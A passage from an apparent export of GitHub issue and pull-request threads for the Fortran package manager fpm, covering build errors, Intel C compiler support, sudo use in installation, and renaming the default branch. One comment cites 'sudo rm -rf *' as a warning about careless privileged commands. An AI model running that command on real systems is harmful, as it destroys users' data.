            "text": "The attached code fails to build:\n  simon@localhost autodiff (master)]$ fpm build\n   + mkdir -p build/dependencies\n   + mkdir -p build/gfortran_2A42023B310FA28D/autodiff\n   + gfortran -c ././src/avd.f90 -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/autodiff -I build/gfortran_2A42023B310FA28D/autodiff -o build/gfortran_2A42023B310FA28D/autodiff/src_avd.f90.o\n   + gfortran -c app/av_utest.f90 -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fcheck=bounds -fcheck=array-temps -fbacktrace -fcoarray=single -J build/gfortran_2A42023B310FA28D/autodiff -I build/gfortran_2A42023B310FA28D/autodiff -o build/gfortran_2A42023B310FA28D/autodiff/app_av_utest.f90.o\n  app/av_utest.f90:19:12:\n  \n     19 |         u = 0.5*sin(2*a)\n        |            1\n  Error: Unexpected derived-type entities in binary intrinsic numeric operator \u2018*\u2019 at (1)\n  compilation terminated due to -fmax-errors=1.\n   Command failed\n  ERROR STOP \n  \n  Error termination. Backtrace:\n  #0  0x4118f9 in __fpm_environment_MOD_run\n          at ././src/fpm_environment.f90:144\n  #1  0x476d4a in build_target\n          at ././src/fpm_backend.f90:247\n  #2  0x476d4a in __fpm_backend_MOD_build_package\n          at ././src/fpm_backend.f90:76\n  #3  0x41966b in __fpm_MOD_cmd_build\n          at ./src/fpm.f90:270\n  #4  0x402422 in MAIN__\n          at app/main.f90:26\n  #5  0x402422 in main\n          at app/main.f90:9\n\nThis is a working project which builds and runs fine with makefiles. It looks as if the problem could be due to the fact that the submodule needs to be compiled after the module. As an aside I don't think fpm itself should be reporting its own call stack in the final release.",
            "comments": [
                {
                    "user": "sgeard",
                    "date": "2021-04-10 10:34:48+00:00",
                    "text": "Seems I can't attach a tgz file :( - I'll try to think of something else"
                },
                {
                    "user": "sgeard",
                    "date": "2021-04-10 10:38:04+00:00",
                    "text": "autodiff.gz\n... but it does support .gz - go figure!\nExtract with\ntar xf autodiff.gz"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-10 10:51:58+00:00",
                    "text": "I got it to build with\nfpm build --profile debug --flag -fdefault-real-8\n\nor by applying this patch to remove some implied real(4) to real(8) conversions:\ndiff --git a/app/av_utest.f90 b/app/av_utest.f90\nindex a5770f0..87935e0 100644\n--- a/app/av_utest.f90\n+++ b/app/av_utest.f90\n@@ -16,10 +16,10 @@ program utest\n         ref = T1(0.5*sin(1.0),cos(1.0)) !,-2*sin(1.0d0)) !,-4*cos(1.0d0),8*sin(1.0d0))\n         call testResult_av1('T1 => sin(x)*cos(x)',ref,w)\n \n-        u = 0.5*sin(2*a)\n+        u = 0.5d0*sin(2*a)\n         call testResult_av1('T1 => 0.5*sin(2x)',ref,u)\n \n-        s = 0.5\n+        s = 0.5d0\n         w = s**3 + s\n         ref = T1(0.5**3+0.5,3*0.5**2 + 1) !,6*0.5) !, 6, 0)\n         call testResult_av1('T1 => x**3 + x',ref,w)\n@@ -38,10 +38,10 @@ program utest\n         ref = T2(0.5*sin(1.0),cos(1.0),-2*sin(1.0)) !,-4*cos(1.0d0),8*sin(1.0d0))\n         call testResult_av2('T2 => sin(x)*cos(x)',ref,w)\n \n-        u = 0.5*sin(2*a)\n+        u = 0.5d0*sin(2*a)\n         call testResult_av2('T2 => 0.5*sin(2x)',ref,u)\n \n-        s = 0.5\n+        s = 0.5d0\n         w = s**3 + s\n         ref = T2(0.5**3+0.5,3*0.5**2 + 1,6*0.5) !, 6, 0)\n         call testResult_av2('T2 => x**3 + x',ref,w)\n@@ -61,10 +61,10 @@ program utest\n         ref = T3(0.5*sin(1.0),cos(1.0),-2*sin(1.0),-4*cos(1.0)) !,8*sin(1.0d0))\n         call testResult_av3('T3 => sin(x)*cos(x)',ref,w)\n \n-        u = 0.5*sin(2*a)\n+        u = 0.5d0*sin(2*a)\n         call testResult_av3('T3 => 0.5*sin(2x)',ref,u)\n \n-        s = 0.5\n+        s = 0.5d0\n         w = s**3 + s\n         ref = T3(0.5**3+0.5,3*0.5**2 + 1,6*0.5, 6)\n         call testResult_av3('T3 => x**3 + x',ref,w)\n@@ -94,10 +94,10 @@ program utest\n         ref = T4(0.5*sin(1.0),cos(1.0),-2*sin(1.0),-4*cos(1.0),8*sin(1.0))\n         call testResult_av4('T4 => sin(x)*cos(x)',ref,w)\n...skipping...\n         call testResult_av3('T3 => x**3 + x',ref,w)\n@@ -94,10 +94,10 @@ program utest\n         ref = T4(0.5*sin(1.0),cos(1.0),-2*sin(1.0),-4*cos(1.0),8*sin(1.0))\n         call testResult_av4('T4 => sin(x)*cos(x)',ref,w)\n \n-        u = 0.5*sin(2*a)\n+        u = 0.5d0*sin(2*a)\n         call testResult_av4('T4 => 0.5*sin(2x)',ref,u)\n \n-        s = 0.5\n+        s = 0.5d0\n         w = s**3 + s\n         ref = T4(0.5**3+0.5,3*0.5**2 + 1,6*0.5, 6, 0)\n         call testResult_av4('T4 => x**3 + x',ref,w)\n@@ -142,11 +142,11 @@ program utest\n         ref = T4(t*y,1+log(2.0)+log(t),1/t,-1/t**2,2/t**3)\n         call testResult_av4('T4 => x*log(2x)',ref,w)\n \n-        u = 0.5*sinh(2*a)\n+        u = 0.5d0*sinh(2*a)\n         ref = T4(0.5*sinh(1.0),cosh(1.0),2*sinh(1.0),4*cosh(1.0),8*sinh(1.0))\n         call testResult_av4('T4 => 0.5*sinh(2x)',ref,u)\n \n-        u = 0.5*cosh(2*a)\n+        u = 0.5d0*cosh(2*a)\n         ref = T4(0.5*cosh(1.0),sinh(1.0),2*cosh(1.0),4*sinh(1.0),8*cosh(1.0))\n         call testResult_av4('T4 => 0.5*cosh(2x)',ref,u)"
                },
                {
                    "user": "sgeard",
                    "date": "2021-04-10 10:59:25+00:00",
                    "text": "Nice catch. The compiler options I use in my makefiles for gfortran/debug builds:\n-fPIC -cpp -std=f2018 -fimplicit-none -fdefault-real-8 -ffree-line-length-200 -Wall -Wextra -Jobj_gfortran_debug -D_DEBUG -W -ggdb -fbounds-check -ffpe-trap=denormal,invalid\nand for ifort/debug builds:\n-fPIC -fpp -r8 -module obj_intel_debug -D_DEBUG -g -check bounds -warn all -debug-parameters used -traceback\nI never want real*4 so this gets round having to specify d0 everywhere. Can I put the compiler options in the .toml file?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-10 11:07:21+00:00",
                    "text": "Not yet, unfortunately, but we are on it. See #350 and #112 for the discussion so far."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-10 11:13:30+00:00",
                    "text": "The next best option will be the response file support John is adding with #364. This will make specifying custom arguments easier until we get the compile profiles into the package manifest."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-10 11:13:45+00:00",
                    "text": "I never want real*4 so this gets round having to specify d0 everywhere.\n\nThat's a nice trick, even if achieved in a non-standard way using compiler flags."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-10 15:05:05+00:00",
                    "text": "I never want real*4 so this gets round having to specify d0 everywhere.\n\nThat's a nice trick, even if achieved in a non-standard way using compiler flags.\n\nI'm not so much a fan of relying on compiler flags for correctness in compilation or execution; it just causes issues when testing other compilers/build systems and makes your code difficult to use by someone else not familiar with it. Considering the small size of Sebastian's patch in this instance, the custom compiler flag doesn't seem beneficial IMO.\nSince this is to do with compiler flags I'll close this issue."
                }
            ]
        },
        {
            "number": 433,
            "user": "LKedward",
            "date": "2021-04-09 13:34:51+00:00",
            "title": "Fix to allow compiling C with Intel CC",
            "text": "Minimal set of changes to invoke a separate C compiler instead of passing C code to the Fortran compiler\nAllows compiling packages with C code using Intel compiler collection, Fixes #426\nC compiler is chosen automatically based on the Fortran compiler selection\n\nCompanion compiler chosen if known, otherwise fall-back to invoking the Fortran compiler for C as done currently\nC compiler can alternatively be specified explicitly using environment variable FPM_C_COMPILER\n\n\n\n\n\n\nCompiler ID\nFC\nCC\n\n\n\n\ngcc\ngfortran\ngcc\n\n\nintel_classic\nifort\nicc\n\n\nintel_llvm\nifx\nicx\n\n\nintel_flang\nflang\nclang\n\n\nibmxl\nxlf\nxlc\n\n\n\nNot addressed in this PR: specifying C compiler flags",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-04-11 14:04:15+00:00",
                    "text": "Good point, I agree. That seems like a natural direction to take with the targets in the future."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-11 15:21:23+00:00",
                    "text": "The Rust cc crate converged to having separate Build (a builder for compilation of a native library) and Tool (configuration used to represent an invocation of a C compiler) abstractions. Their is of course the important difference that fpm is more like cargo and the cc crate all in one, so there is perhaps more potential to share information across layers."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-16 08:26:08+00:00",
                    "text": "Should this do something about flags when compiling C code? I'm fine if we want to add that as a separate PR, just curious.\n\nI thought that best left for a separate PR, since it will require some discussion about best approaches."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-17 10:07:25+00:00",
                    "text": "Thanks for the reviews. I'll merge later today if there are no further comments."
                }
            ]
        },
        {
            "number": 432,
            "user": "rouson",
            "date": "2021-04-08 05:02:19+00:00",
            "title": "feat(install.sh): sudo {mkdir|cp} if necessary",
            "text": "This commit causes fpm to invoke mkdir and/or cp using sudo if\nthe user lacks write permissions to the installation destination on Unix-like\nsystems. Invoking sudo potentially prompts the user for a\npassword.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-04-08 07:09:26+00:00",
                    "text": "My understanding of best practices with regards to sudo is that it should be left to the user to invoke manually at a top level. i.e. the correct procedure is to do sudo fpm ...  rather than have fpm call sudo from within. This is much more transparent to the user and does not introduce interactivity to the fpm workflow. It should be also noted that sudo isn't available on all systems."
                },
                {
                    "user": "rouson",
                    "date": "2021-04-08 07:39:59+00:00",
                    "text": "@LKedward I've always been advised to do the exact opposite.  Think of it this way: fpm is now an approximately 21,000-line program and growing.  Running sudo fpm ... gives the potential for every single line of code to execute with superuser privileges.  That means a tremendous amount of havoc can be wreaked even just by mistake and worse yet if there's anything malicious that creeps into the code.  By contrast, when sudo is run only for each command that needs it, the user will be prompted at least the first time and possibly each time.  Also, the prompt will or at least should indicate what specific command will be granted sudo privileges.\nMoreover, running sudo fpm ... implies that all files created along the way will require sudo rm ... to remove, which adds additional ways in which the process can go wrong: one slip with something like sudo rm -rf * executed mistakenly in the wrong place and the user ends up in really bad shape.\nI strongly advise against recommending sudo fpm ...."
                },
                {
                    "user": "vmagnin",
                    "date": "2021-04-08 11:01:43+00:00",
                    "text": "Interesting discussion!\nSee my new post: https://fortran-lang.discourse.group/t/what-about-security-issues-in-fortran/102/15"
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-08 11:02:59+00:00",
                    "text": "Thanks for the explanation Damian @rouson, I agree with your concerns about elevating the entire fpm binary. Your point is particularly acute for fpm currently since it relies heavily on execute_command_line for much of it's file-system access (see also #166); this is something that we aim to phase-out completely with a proper file-system library (e.g. MarDiehl/stdlib_os).\nWith that said I am still unsure about the chosen methodology here to invoke sudo from within fpm. We can't use sudo if we want to switch to using a file-system API call in future. I am no expert here, particularly for cross-platform implementation, but I think a better approach would be to use system APIs to drop any elevated permissions immediately when fpm is started and then switch back only where needed. In POSIX, I think this can be achieved with getuid/seteuid etc."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-04-08 11:11:21+00:00",
                    "text": "How about this strategy:\nInstead of doing sudo underneath, report the problem to the user and write\na small shell script/batch file that the user can run using sudo\nhim/herself.\n\nOp do 8 apr. 2021 om 13:03 schreef Laurence Kedward <\n***@***.***>:\n\u2026\n Thanks for the explanation Damian @rouson <https://github.com/rouson>, I\n agree with your concerns about elevating the entire *fpm* binary. Your\n point is particularly acute for *fpm* currently since it relies heavily\n on execute_command_line for much of it's file-system access (see also #166\n <#166>); this is something that\n we aim to phase-out completely with a proper file-system library (*e.g.*\n MarDiehl/stdlib_os <https://github.com/MarDiehl/stdlib_os>).\n\n With that said I am still unsure about the chosen methodology here to\n invoke sudo from within *fpm*. We can't use sudo if we want to switch to\n using a file-system API call in future. I am no expert here, particularly\n for cross-platform implementation, but I think a better approach would be\n to use system APIs to drop any elevated permissions immediately when *fpm*\n is started and then switch back only where needed. In POSIX, I think this\n can be achieved with getuid/seteuid *etc.*\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#432 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR55NJGDK7QTHUTNCWLTHWEPPANCNFSM42SC4C3Q>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-08 11:27:05+00:00",
                    "text": "You should seldom run into a scenario where you have to use sudo in a build system. I have packaged for Arch Linux, msys2, brew and conda so far, Arch's makepkg even refuses to run under sudo. Usually a package manager will package in a local prefix instead of the system root, installing directly from the build system (good old sudo make install) is hardly ever a recommended strategy."
                },
                {
                    "user": "rouson",
                    "date": "2021-04-09 14:42:50+00:00",
                    "text": "@awvwgk Your comment makes sense for individual users but presumably not for system administrators.   Is the intention that fpm not be used by system administrators?  I'm effectively the system administrator for the free Sourcery Institute Linux virtual machine that we use frequently in courses we teach and with consulting clients.  The virtual machine runs Lubuntu Linux. I install packages in the virtual machine with sudo apt install ... frequently and I don't know of a better way (I tried Homebrew back when it was referred to as Linuxbrew on Linux and found it lacking despite it being very useful on macOS).  I also use the virtual machine for my own work so it's important to have separate user accounts and I usually encrypt the accounts in the virtual machine for privacy reasons.  That precludes \"local\" installation, if by that phrase you're referring to installing in a user's home directory.\nThe whole point of the virtual machine is to ensure that course attendees and clients have necessary software pre-installed so that we don't spend time on set-up.  This necessitates installing to a common space.  Also, the default install locations for many (most?) CMake packages is in a subdirectory of/usr so I'm not sure why it would be considered unusual to require sudo for installation."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-09 15:26:42+00:00",
                    "text": "I'd think it makes also (especially?) sense for system operators. I'm not familar with the dpkg / apt-get / .deb family of package managers, since I'm usually work with Arch Linux based distros. While the toolchains are named differently, I would expect the workflow to be similar:\n\nWrite the package build file (PKGBUILD on Arch, debian/{control,rules,...} on Debian, ...)\nBuild the package as user (makepkg on Arch, debuild -us -uc on Debian, ...)\nInstall the package with sudo (sudo pacman -U <pkg> on Arch, sudo dpkg -i <pkg> on Debian, ...)\n\nUsually, this is done by somebody else and you can just access the binary package by sudo pacman -S <name> / sudo apt-get install <name>. But for Arch based distros it is not uncommon for users to package themselves, partly because the distro is smaller than Debian/Ubuntu, but mainly because the process is streamlined and thoroughly documented. At least for me it seems like a natural thing to do when I encounter software I want to install but don't find in my package manager."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-09 15:41:29+00:00",
                    "text": "I see merits to both sides of the argument.\nI still prefer fpm not doing anything internally about permissions, if at all possible. It's not fpm's responsibility and it adds complexity to future development.\nIf you really need to install to system paths, then sudo it at your own risk.\nSo I prefer this be handled with a note in the docs a-la:\n\nWe don't recommend running fpm with administrator permissions. If you need to do that, for example for installing packages into system path, do it carefully and at your own risk."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-09 15:48:04+00:00",
                    "text": "We already have means to restrict fpm when running with elevated permissions, e.g. the install command supports a --no-rebuild:\nfpm build\nsudo fpm install --prefix=/usr --no-rebuild\n\nAlternatively, there is always the do-it-yourself --runner variant available with\nfpm run --runner \"sudo install -Dm 755\" -- /usr/bin/fpm"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-09 15:58:42+00:00",
                    "text": "I think this idea has merit. The security \"principle of least privilege\" says that elevated permissions should only be given when necessary. The whole fpm executable doesn't need escalated privileges, even for the command fpm install, so we should limit the places where privileges are escalated to the places that we know they're needed.\nThat said, we're not quite ready to do it in a cross-platform way reliably. We should create an issue to do this once we have a more fully featured os module. The use case of a system admin wanting to install an fpm package for all users is pretty likely, and saying to them \"learn how to create a system package\" or \"trust that fpm won't do anything dangerous when run with sudo\" I think is not a satisfying answer."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-09 15:59:52+00:00",
                    "text": "Maybe relevant to this discussion:\n\nShould the sudo command be used with Git?\nRecommended way to install software to /usr/local \u2014 use sudo or chown?"
                },
                {
                    "user": "rouson",
                    "date": "2021-04-09 16:00:58+00:00",
                    "text": "@awvwgk your latest comment is very helpful.  I like the fpm build && sudo fpm install ... approach.  I'm closing this pull request.\nIn retrospect, it would have been better for me to describe my use case in an issue before submitting this pull request.  I was attempting to install fpm itself in the aforementioned virtual machine under /usr/local.  This is the one scenario in which fpm build && sudo fpm install ... won't work (unless there's a prior fpm installation).  @everythingfunctional just pointed out to me that the more appropriate place to invoke sudo in my scenario is inside install.sh.  I will submit this feature request as an issue to solicit feedback and then create a new pull request to edit install.sh if there's consensus that my suggestion is acceptable."
                }
            ]
        },
        {
            "number": 431,
            "user": "everythingfunctional",
            "date": "2021-04-08 00:21:00+00:00",
            "title": "Use different compiler flags on different platforms for Intel",
            "text": "I've tested both profiles (debug and release) on each platform (Windows, MacOS, and Linux) for both Intel compilers (ifort and ifx) and none of them report an problems with flags now.\nNote that ifx is not available on MacOS currently, so that is not included in the set of available compilers.\nAlso Note: none of the Intel compilers were able to compile fpm. ifort gives the following error on all three platforms:\n./src/fpm/manifest/build.f90: error #6405: The same named entity from different modules and/or program units cannot be referenced.   [TOML_TABLE]\n\nifx hits an ICE on Windows, and gives the following error on Linux:\nbuild/dependencies/M_CLI2/src/M_CLI2.f90(1322): error #5533: Feature found on this line is not yet supported in ifx \n            args=[character(len=imax) :: args,current_argument]\n----------------------------------------------^\n\nbut those are issues for another day.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-09 01:50:24+00:00",
                    "text": "Thanks for the review guys."
                }
            ]
        },
        {
            "number": 430,
            "user": "awvwgk",
            "date": "2021-04-07 21:07:46+00:00",
            "title": "Revisit extra table in package manifest",
            "text": "This might be helpful for plugins that want to store their configuration in the package manifest while avoiding to clash with any actual fpm reserved keywords. All fpm has to do is ignore any entries in a special table (maybe named extra(s), plugin(s), ...).\nSee #232 for the original proposal.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2021-08-03 13:44:34+00:00",
                    "text": "As suggested here: https://fortran-lang.discourse.group/t/joining-the-team/1626/6, we could use this to specify formatting options like:\n[extra.lfortran.fmt]\nindent = 3\nThat makes sense, to have all such project specific options in fpm.toml and we can teach fpm about formatting via LFortran (and/or other tools)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-08-04 18:09:43+00:00",
                    "text": "I opened lfortran!487."
                }
            ]
        },
        {
            "number": 429,
            "user": "rouson",
            "date": "2021-04-07 06:07:08+00:00",
            "title": "feat(install.sh): use wget if curl is missing",
            "text": "Current behavior\nThe install.sh installation script fails if curl is not present.\nBehavior enabled by this PR\nUse wget when curl is missing.\nUse Case\nThe Lubuntu lightweight Ubuntu distribution has wget by default but not curl.",
            "comments": [
                {
                    "user": "rouson",
                    "date": "2021-04-07 17:42:54+00:00",
                    "text": "@awvwgk the latest commit fulfills your requested change.  I think this is ready to merge if the CI tests pass.  Shall I do the merge or someone else?"
                }
            ]
        },
        {
            "number": 427,
            "user": "brocolis",
            "date": "2021-04-06 02:57:22+00:00",
            "title": "Command line is too long",
            "text": "Steps to reproduce\nfpm new tmp\ncd tmp\nAdd to fpm.toml:\n[dependencies]\nblas = {git = \"https://github.com/brocolis/blas\" }\nBack to terminal,\nfpm build\nAfter some time, I got an error\n+ ar -rs build\\gfortran_2A42023B310FA28D\\tmp\\libtmp.a build\\gfortran_2A42023B310FA28D\\tmp\\src_tmp.f90.o \u2026 \n\nCommand line is too long\n Command failed\nERROR STOP",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-04-06 06:36:43+00:00",
                    "text": "I have seen issues regarding this in the ninja build system, this is a known issue on Windows. Their solution is to rely on response files to pass the command line rather than actual command line arguments for this reason."
                }
            ]
        },
        {
            "number": 426,
            "user": "everythingfunctional",
            "date": "2021-04-05 19:03:23+00:00",
            "title": "Cannot Compile C code with Intel",
            "text": "The current method of allowing C code in a project does not allow compiling with the Intel compilers. Other compilers (I've tried gfortran, nagfor and nvfortran) recognize the .c extension and just work, although I do get the following warning from gfortran:\ncc1: warning: command-line option \u2018-Wimplicit-interface\u2019 is valid for Fortran but not for C\ncc1: warning: command-line option \u2018-fcheck=bounds\u2019 is valid for Fortran but not for C\ncc1: warning: command-line option \u2018-fcheck=array-temps\u2019 is valid for Fortran but not for C\ncc1: warning: command-line option \u2018-fbacktrace\u2019 is valid for Fortran but not for C\ncc1: warning: command-line option \u2018-fcoarray=single\u2019 is valid for Fortran but not for C\n\nBut the Intel compilers (both ifort and ifx), issue the following message, and do not compile the C code.\nifort: warning #10145: no action performed for file './src/say_hello.c'\n\nI'm guessing one must explicitly compile C code with icc (or icx) in order to mix C and Fortran with Intel.",
            "comments": []
        },
        {
            "number": 425,
            "user": "everythingfunctional",
            "date": "2021-04-05 14:49:52+00:00",
            "title": "Need Ability to Specify Options for Specific Files",
            "text": "With the Haskell version phased out, I checked to see if the Fortran version could build my sqliteff project, and unfortunately it can't. I need to add -DSQLITE_OMIT_LOAD_EXTENSION -DSQLITE_THREADSAFE=0 when compiling sqlite3.c but I don't have a way to do that with the Fortran version of fpm.\nPreviously I was using the build script option and a (admittedly not very portable) Makefile. But the Fortran version doesn't support that option (yet).\nWhat do you guys think the proper path forward would be? Should we include a way of specifying additional compiler arguments for specific files? Or should we add the build script option to the Fortran version? I know there was some discussion about that and the implementation from the Haskell version wasn't exactly the design a lot of people wanted to stick with. (see #351, #94, #249, #219 and #118 are the discussions I could find)\nI suppose in my case I could just \"manually preprocess\" the sqlite3.c file so those options wouldn't be needed, but I'd consider that a short term workaround.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-04-05 17:51:15+00:00",
                    "text": "Looks like you need a way to set preprocessor variables for this in the package manifest by some means. This could be done by setting compiler variables in a compilation profile or by hiding it in some kind of one-way build script, leaving aside that we don't have support for neither, both approaches seem not really well-suited for this purpose IMO. Maybe looking into this together with the preprocessor support in fpm might be the best way forward here.\nThe package manifest could provide some way to set variables for the preprocessor to static values:\n[preprocessor.variables]  # maybe .local/.global for project scope vs. global scope?\nSQLITE_OMIT_LOAD_EXTENSION=1\nSQLITE_THREADSAFE=0"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-05 22:05:26+00:00",
                    "text": "I kind of like the idea of preprocessor variables for this use case."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-06 00:46:52+00:00",
                    "text": "Should there be a command line syntax for this too?\nIn many cases preprocessor variables are used to deal with platform specific issues (e.g. a processor or compiler supports certain features). Presumably, this would be the job of a custom build script to figure out (e.g. does the compiler support xyz syntax or does my processor have a fused-multiply add instruction) and specify the right options.\nIn other cases preprocessor variables might be used to choose between different algorithms (accurate algorithm vs sloppy algorithm), which is something the user might want to select at build time, but ultimately the package implementors should strive to offer a sane default.\nIn case of an interface library like sqliteff it makes sense you have to fix the preprocessor variables at a local project level (through the manifest or a custom build script), and document the consequences it carries for your package (e.g. the library is not thread safe).\nWhat would be the purpose of a preprocessor variable with global scope? (I understand this as a flag given to all project dependencies built by fpm). I'm not sure if this is something which makes sense."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-04-06 00:52:00+00:00",
                    "text": "I think Cargo probably deals with this through their \"features\" capability and custom build scripts. I'm not quite clear on the design of that capability though, or how well it would mesh with our design of fpm."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-04-06 01:25:25+00:00",
                    "text": "Indeed, Cargo build scripts can receive input through a CARGO_CFG_<cfg>variable, and have the possibility to communicate configuration settings back using the instructions\ncargo:rustc-cfg=KEY[=\"VALUE\"] \u2014 Enables compile-time cfg settings.\n\n\nWhich configuration options are set is determined statically during the compilation of the crate. Certain options are compiler-set based on data about the compilation. Other options are arbitrarily-set, set based on input passed to the compiler outside of the code. It is not possible to set a configuration option from within the source code of the crate being compiled.\n\nThe compiler-set options are mainly related to the platform (Unix or Windows) and properties of the target (CPU architecture, CPU features, operating system, pointer width, endianess, etc.) so they cover what I described above as the need for platform-specific preprocessing.\nI think it will take a while before we can arrive at something similar, so maybe if we can pinpoint the behavior of simple build scripts in #219 (and replicate the Haskell-fpm behavior) it is the best short-term solution for you."
                }
            ]
        },
        {
            "number": 423,
            "user": "awvwgk",
            "date": "2021-04-02 08:58:20+00:00",
            "title": "Use default instead of master to reference the repository HEAD",
            "text": "See #421 for details.",
            "comments": []
        },
        {
            "number": 422,
            "user": "brocolis",
            "date": "2021-04-01 17:09:44+00:00",
            "title": "Changing link entry doesn't trigger relinking targets",
            "text": "Consider this section in fpm.toml\n[build]\nlink = [\"lapack\", \"blas\"]\n\nI can run fpm build, etc. When I change the section to\n[build]\nlink = [\"lapack\", \"openblas\"]\n\nthen fpm build doesn't link the project using the new settings (nothing happens).",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-04-01 18:45:50+00:00",
                    "text": "Hi @brocolis, can you try without lapack, just openblas on its own? I don't think you need both lapack and openblas together."
                },
                {
                    "user": "brocolis",
                    "date": "2021-04-01 19:07:43+00:00",
                    "text": "Hi @LKedward, it doesn't work either. I also tried link = [\"nonexistent\", \"nonono\"] , nothing happens.\n\nIt looks like I have to delete the build subdirectory and build everything from the start."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-01 19:51:41+00:00",
                    "text": "I think the issue is that the manifest is currently not hashed, but probably should be. We could either hash the complete the fpm.toml and always rebuild on any change (lot's of unnecessary rebuiilds) or hash relevant sections like build.link or the link entry in the targets and have the link step depend on this change."
                },
                {
                    "user": "LKedward",
                    "date": "2021-04-02 09:08:10+00:00",
                    "text": "Ah yes of course. Agreed, we should hash the relevant sections of the manifest."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-09 11:41:24+00:00",
                    "text": "A good mechanism for this would be to use a different output directory for the executables which additionally depends on the link arguments and not only on the compile arguments.\nI talked with Jakub @kubajj about this in the context of the compiler profiles, the different build directories implemented there would provide the required mechanism to resolve this and would also provide a way to get the first part of the compiler profiles into fpm."
                },
                {
                    "user": "kubajj",
                    "date": "2021-09-09 11:49:51+00:00",
                    "text": "So if I understood correctly, do we need to add the hash of build.link into the build name directory of the executable that depends on the link target?"
                }
            ]
        },
        {
            "number": 421,
            "user": "rouson",
            "date": "2021-04-01 14:47:53+00:00",
            "title": "Let's change the name of the default branch to \"main\"",
            "text": "Please see https://www.zdnet.com/article/github-to-replace-master-with-main-starting-next-month/.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-04-01 15:16:20+00:00",
                    "text": "\ud83d\udc4d from me."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-01 15:21:50+00:00",
                    "text": "From a technical point of view an organisation owner of @fortran-lang or a member with administrator access scope can make the default branch rename at https://github.com/fortran-lang/fpm/settings/branches. Usually additional migrations are required:\n\nwe have a workflow where the name of the default branch is hard coded\n\n  \n    \n      fpm/.github/workflows/docs.yml\n    \n    \n         Line 18\n      in\n      d9dc9f2\n    \n    \n    \n    \n\n        \n          \n           if: github.event_name == 'push' && github.repository == 'fortran-lang/fpm' && ( startsWith( github.ref, 'refs/tags/' ) || github.ref == 'refs/heads/master' ) \n        \n    \n  \n\n\nwe are referencing the default branch name in the fpm help page, documentation and contributing guide lines\nsearch below for master in this project, lot's of false positives, but some fpm related links are present:\n\n\u276f rg master .\n./PACKAGING.md\n649:`helloff = { git = \"https://gitlab.com/everythingfunctional/helloff.git\", branch = \"master\" }`,\n\n./CONTRIBUTING.md\n12:[fpm license](https://github.com/fortran-lang/fpm/blob/master/LICENSE).\n24:[Fortran stdlib style guide](https://github.com/fortran-lang/stdlib/blob/master/STYLE_GUIDE.md)\n38:   Try to reproduce it with the latest version from the master branch.\n112:  [Fortran stdlib style guide](https://github.com/fortran-lang/stdlib/blob/master/STYLE_GUIDE.md).\n\n./docs.md\n5:project_download: https://github.com/fortran-lang/fpm/archive/master.zip\n\n./src/fpm_command_line.f90\n715:    '   https://github.com/fortran-lang/fpm/blob/master/manifest-reference.md        ', &\n\n./src/fpm/cmd/new.f90\n136:        &'  #     https://github.com/fortran-lang/fpm/blob/master/manifest-reference.md   ',&\n138:        &'  #     https://github.com/fortran-lang/fpm/blob/master/PACKAGING.md            ',&\n350:        &'  # like. By default the latest master master branch is used. You can           ',&\n357:        &'#stdlib = {git=\"https://github.com/LKedward/stdlib-fpm.git\",branch = \"master\" },',&\n\n./manifest-reference.md\n406:toml-f = { git = \"https://github.com/toml-f/toml-f\", branch = \"master\" }\n\n\nother @fortran-lang projects might also reference files in the fpm repo"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-01 15:35:46+00:00",
                    "text": "I'm all for migrating the default branch name, but I don't think it makes much sense unless it happens for all @fortran-lang repositories. Beside fpm those repositories are currently using master as name for the default branch\n\nhttps://github.com/fortran-lang/stdlib\nhttps://github.com/fortran-lang/stdlib-docs\nhttps://github.com/fortran-lang/fpm-haskell\nhttps://github.com/fortran-lang/fpm-registry\nhttps://github.com/fortran-lang/fortran-lang.org\nhttps://github.com/fortran-lang/talks\nhttps://github.com/fortran-lang/benchmarks"
                },
                {
                    "user": "milancurcic",
                    "date": "2021-04-02 17:59:16+00:00",
                    "text": "I'm all for migrating the default branch name, but I don't think it makes much sense unless it happens for all @fortran-lang repositories.\n\nWe should do it for all repos but it doesn't need to happen all at once.\nFor the transition, instead of renaming \"master\" -> \"main\" in the settings, do you think this flow would work:\n\nCreate a branch \"main\" from \"master\"\nDo necessary PRs for docs and CI to work with \"main\"\nChange default branch in settings from \"master\" to \"main\"\nDelete \"master\" branch."
                },
                {
                    "user": "rouson",
